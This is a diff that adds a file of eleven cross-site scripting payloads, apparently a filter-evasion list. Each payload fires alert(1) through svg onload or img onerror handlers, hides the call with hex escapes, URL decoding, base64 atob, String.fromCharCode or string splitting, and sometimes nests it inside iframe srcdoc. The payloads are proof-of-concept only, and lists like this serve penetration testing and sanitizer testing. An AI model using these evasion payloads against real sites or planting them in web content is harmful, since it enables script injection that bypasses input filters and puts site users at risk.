@@ -1,0 +1,11 @@
+<iframe srcdoc="<img src=x onerror=setTimeout('al'+'ert(1)',0)>"></iframe>
+<svg onload=window['\x61\x6c\x65\x72\x74'](1)>
+<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>"></iframe>
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<iframe srcdoc="<svg onload=setTimeout('al'+'ert(1)',0)>"></iframe>
+<svg onload=window['\x61\x6c\x65\x72\x74'](1)>
